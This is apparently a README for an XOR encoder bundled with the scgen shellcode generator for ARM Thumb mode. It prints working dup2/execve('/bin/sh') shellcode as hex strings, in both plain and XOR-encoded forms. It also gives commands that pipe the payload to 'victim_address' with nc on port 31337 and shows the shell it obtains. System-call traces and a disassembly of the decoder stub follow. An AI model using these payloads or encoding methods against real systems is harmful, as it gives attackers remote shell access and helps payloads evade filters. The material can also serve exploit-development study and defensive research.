### XOR Encoder for thumb mode shellcode

This code already included in scgen. Plus all ideas came from Internet. (thanks all of shellcode writers) 

#### Usage ####

:  before applied to XOR Encoder 

```
$ scgen -a arm dupsh 4 -f s
"\x04\x90\xa0\xe3\x02\x80\xa0\xe3\x09\x00\xa0\xe1\x08\x10\xa0\xe1\x3f\x70\x00\xe3\x00\x00\x00\xef\x01\x80\x58\xe2\xf9\xff\xff\x5a\x10\x00\x8f\xe2\x00\x20\xa0\xe3\x05\x00\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\x00\xe3\x00\x00\x00\xef\x2f\x62\x69\x6e\x2f\x73\x68\x00"

$ (printf "\x04\x90\xa0\xe3\x02\x80\xa0\xe3\x09\x00\xa0\xe1\x08\x10\xa0\xe1\x3f\x70\x00\xe3\x00\x00\x00\xef\x01\x80\x58\xe2\xf9\xff\xff\x5a\x10\x00\x8f\xe2\x00\x20\xa0\xe3\x05\x00\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\x00\xe3\x00\x00\x00\xef\x2f\x62\x69\x6e\x2f\x73\x68\x00";cat)
| nc victim_address 31337

id
uid=1001(alex) gid=1002(alex) groups=1002(alex)
uname -a
Linux linaro-developer 3.2.0 #7 SMP Thu Feb 28 16:20:18 PST 2013 armv7l armv7l armv7l GNU/Linux

```

: tracing the system calls
```
<snip>
[pid  1240] [00014018] dup2(4, 2)       = 2
[pid  1240] [00014018] dup2(4, 1)       = 1
[pid  1240] [00014018] dup2(4, 0)       = 0
[pid  1240] [00014038] execve("/bin/sh", ["/bin/sh"], [/* 0 vars */]) = 0
[pid  1240] [2aaca9f6] brk(0)           = 0x22000
[pid  1240] [2aacafac] uname({sys="Linux", node="linaro-developer", ...}) = 0
</snip>

```
#### after applying to XOR Encoder ####

```
$ scgen -a thumb dupsh 4 -f r | ./XOREncoder.py -f s
"\x42\x80\x8f\xe2\xd5\x40\xa0\xe3\x20\x60\x8f\xe2\x01\x0c\x54\xe3\x16\xff\x2f\x81\xd5\x40\x44\xe2\x04\x50\xd8\xe7\x02\x50\x25\xe2\x04\x50\xc8\xe7\xd6\x40\x84\xe2\xf7\xff\xff\xea\xf4\xff\xff\xeb\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x6d\x1b\x01\x35\xb6\x1b\x60\xb4\x60\xb4\x68\x46\x69\x46\xa2\x27\x01\xdf\xc0\x46\x01\x23\x3d\x25\x90\x18\x06\x27\x2a\x1e\x03\x3b\x03\xdd\x93\x40\xf8\xd3\x7a\x44\x08\x32\x02\x20\x09\x25\x07\xb6\x6b\x44\x03\xdd\x2d\x60\x6b\x6c\x2d\x71\x6a\x02\x02\x02\x08"

$ (printf "\x42\x80\x8f\xe2\xd5\x40\xa0\xe3\x20\x60\x8f\xe2\x01\x0c\x54\xe3\x16\xff\x2f\x81\xd5\x40\x44\xe2\x04\x50\xd8\xe7\x02\x50\x25\xe2\x04\x50\xc8\xe7\xd6\x40\x84\xe2\xf7\xff\xff\xea\xf4\xff\xff\xeb\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x6d\x1b\x01\x35\xb6\x1b\x60\xb4\x60\xb4\x68\x46\x69\x46\xa2\x27\x01\xdf\xc0\x46\x01\x23\x3d\x25\x90\x18\x06\x27\x2a\x1e\x03\x3b\x03\xdd\x93\x40\xf8\xd3\x7a\x44\x08\x32\x02\x20\x09\x25\x07\xb6\x6b\x44\x03\xdd\x2d\x60\x6b\x6c\x2d\x71\x6a\x02\x02\x02\x08";cat) | nc victime_address 31337

id
uid=1001(alex) gid=1002(alex) groups=1002(alex)
uname -a
Linux linaro-developer 3.2.0 #7 SMP Thu Feb 28 16:20:18 PST 2013 armv7l armv7l armv7l GNU/Linux

```

: tracing the system calls
```
<snip>
[pid  1247] [0001404a] nanosleep({1, 0}, 0x7ec22680) = 0 <== It's tricky way to call context switch
[pid  1247] [0001405a] dup2(4, 2)       = 2
[pid  1247] [0001405a] dup2(4, 1)       = 1
[pid  1247] [0001405a] dup2(4, 0)       = 0
[pid  1247] [0001406c] execve("/bin/sh", ["/bin/sh"], [/* 0 vars */]) = 0
[pid  1247] [2aade9f6] brk(0)           = 0x22000
[pid  1247] [2aadefac] uname({sys="Linux", node="linaro-developer", ...}) = 0
</snip>
```

#### disassemble shellcode with XOREncoder ####

```asm
$ scgen -a thumb dupsh 4 -x -f r| asem -d -a arm

0x00000000 (0000): 42 80 8f e2   add      r8, pc, #0x42 <= XOR Encoder start at here
0x00000004 (0004): d6 40 a0 e3   mov      r4, #0xd6
0x00000008 (0008): 20 60 8f e2   add      r6, pc, #0x20
0x0000000c (0012): 01 0c 54 e3   cmp      r4, #0x100
0x00000010 (0016): 16 ff 2f 81   bxhi     r6
0x00000014 (0020): d6 40 44 e2   sub      r4, r4, #0xd6
0x00000018 (0024): 04 50 d8 e7   ldrb     r5, [r8, r4]
0x0000001c (0028): 02 50 25 e2   eor      r5, r5, #2
0x00000020 (0032): 04 50 c8 e7   strb     r5, [r8, r4]
0x00000024 (0036): d7 40 84 e2   add      r4, r4, #0xd7
0x00000028 (0040): f7 ff ff ea   b        #0xc
0x0000002c (0044): f4 ff ff eb   bl       #4
0x00000030 (0048): 01 60 8f e2   add      r6, pc, #1
0x00000034 (0052): 16 ff 2f e1   bx       r6
0x00000038 (0056): 6d 1b 01 35   strlo    r1, [r1, #-0xb6d] <== thumb mode start at here
0x0000003c (0060): b6 1b 60 b4   strbtlt  r1, [r0], #-0xbb6
0x00000040 (0064): 60 b4 68 46   strbtmi  fp, [r8], -r0, ror #8
0x00000044 (0068): 69 46 a2 27   strhs    r4, [r2, sb, ror #12]!
0x00000048 (0072): 01 df 01 23   movwhs   sp, #0x1f01
0x0000004c (0076): 3d 25 90 18   ldmne    r0, {r0, r2, r3, r4, r5, r8, sl, sp}
0x00000050 (0080): 06 27 2a 1e   cdpne    p7, #2, c2, c10, c6, #0
0x00000054 (0084): 03 3b 03 dd   vstrle   d3, [r3, #-0xc]
...

```
